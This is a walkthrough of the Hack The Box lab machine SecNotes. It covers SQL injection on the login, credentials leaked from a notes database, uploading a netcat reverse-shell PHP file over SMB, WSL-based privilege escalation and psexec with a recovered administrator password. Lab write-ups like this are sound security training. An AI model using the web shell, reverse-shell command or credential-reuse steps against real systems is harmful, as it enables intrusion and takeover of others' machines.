---
description: https://app.hackthebox.com/machines/151
---

# 🎶 SecNotes

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

After the nmap scan, we see the web server is a login page:&#x20;

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

I try and create an account and log in->

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We get access to a dashboard and a possible username

let's try unlogging and abuse this web app with SQLis

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

when we connect with the credentials it fills in an error, good news

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We try with some more SQLi patterns and end up having database infos leaked within the dashboard :

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>'OR 1 OR'</p></figcaption></figure>

{% embed url="https://book.hacktricks.xyz/pentesting-web/sql-injection" %}

<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We find what seems to be credentials for an SMB share?

Other than the manual exploitation we could use psexec:

```
psexec.py tyler:'92g!mA8BGjOirkL%OG*&'@10.129.227.170
```

It did not work :

<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

So let's go manually with passwd **92g!mA8BGjOirkL%OG\*&**

```
smbclient \\\\10.129.227.170\\new-site -U tyler
```

<figure><img src="../../.gitbook/assets/image (12) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

now create a file called 'shell.php'

```
<?php system('nc.exe -e cmd.exe 10.10.14.94 9898') ?>
```

and then copy on your root directory netcat:

```
locate nc.exe
cp /usr/share/sqlninja/apps/nc.exe nc.exe
```

and on the smb share of tyler:

```
put shell.php
put nc.exe
```

<figure><img src="../../.gitbook/assets/image (13) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Using the `put` command to upload a reverse shell and your netcat executable to an SMB share on the target system, you're creating a foothold on the target system. Even if your initial access is lost, you can regain access through the uploaded tools and i'll be able to call netcat and so trigger my reverse shell to obtain a shell ->

So now i need to trigger my shell.php file, after some looking around i found where were stored the files:

<figure><img src="../../.gitbook/assets/image (14) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

So i simply request: [http://10.129.163.46:8808/shell.php](http://10.129.163.46:8808/shell.php)

and get a shell:

<figure><img src="../../.gitbook/assets/image (15) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

and go and grab the flag:

<figure><img src="../../.gitbook/assets/image (16) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

For the elevation let's dive into subsystems:

{% embed url="https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#eop-windows-subsystem-for-linux-wsl" %}

first we saw that we needed to locate bash.exe, you can use a recursive search this way:

```
where /R c:\windows bash.exe
```

<figure><img src="../../.gitbook/assets/image (17) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

same for wsl.exe:

```
where /R c:\windows wsl.exe
```

<figure><img src="../../.gitbook/assets/image (18) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

quick explanation on why we're doing this:

<figure><img src="../../.gitbook/assets/image (19) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

after trying to get a bash shell by triggering bash.exe, we get some useful infos:

<figure><img src="../../.gitbook/assets/image (21) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We are root but on a linux machine of secnotes, so not really what we are looking for

we are in a non tty, let's try to escape

for reminder, a non tty refers to a type of device or terminal that does not have interactive capabilities like a traditional teletypewriter or terminal.

Let's try to get a shell via a python import:

```
python -c "import pty;pty.spawn('/bin/bash')"
```

* `python`: This invokes the Python interpreter.
* `-c`: This option allows you to pass a command directly to Python for execution.
* `"import pty; pty.spawn('/bin/bash')"`: This is the Python code that gets executed.
  * `import pty`: This imports the `pty` module, which provides functions for controlling pseudo-terminals.
  * `pty.spawn('/bin/bash')`: This line spawns a new interactive shell (`/bin/bash`). When this line is executed, it effectively starts a new shell session within the current terminal session. The `pty.spawn()` function creates a new pseudo-terminal and executes the specified command (`/bin/bash`) within it. This results in a fully interactive shell prompt, allowing the user to execute commands and interact with the system as if they were using a normal terminal.

<figure><img src="../../.gitbook/assets/image (22) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys" %}

{% embed url="https://wiki.zacheller.dev/pentest/privilege-escalation/spawning-a-tty-shell" %}

now let's look what we have in the root folder:&#x20;

<figure><img src="../../.gitbook/assets/image (23) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

after looking through stuff we encounter:&#x20;

<figure><img src="../../.gitbook/assets/image (24) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

that's a quick and easy win, let's try some other stuff

Impacket Toolkit - [https://github.com/SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket)

first, let's install impacket

```
psexec.py administrator:'u6!4ZwgwOM#^OBf#Nwnh'@10.129.163.46
```

* `psexec.py`: This likely refers to a Python script named `psexec.py`. This script is likely designed to replicate the functionality of the original `PsExec` tool developed by Sysinternals, which allows for the execution of commands on remote Windows systems.
* `administrator:'u6!4ZwgwOM#^OBf#Nwnh'`: This part of the command specifies the username and password to authenticate to the target system. In this case, the username is `administrator` and the password appears to be `'u6!4ZwgwOM#^OBf#Nwnh'`. The password is enclosed in single quotes to ensure that special characters within it are properly interpreted.
* `@10.129.163.46`: This specifies the IP address or hostname of the target Windows system. The `psexec.py` script will attempt to connect to this system using the provided credentials and execute commands remotely.

<figure><img src="../../.gitbook/assets/image (25) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

And just go and fetch the file

<figure><img src="../../.gitbook/assets/image (26) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

If A/V is blocking psexec, you can use smbexec or winexe

<figure><img src="../../.gitbook/assets/image (614).png" alt=""><figcaption></figcaption></figure>
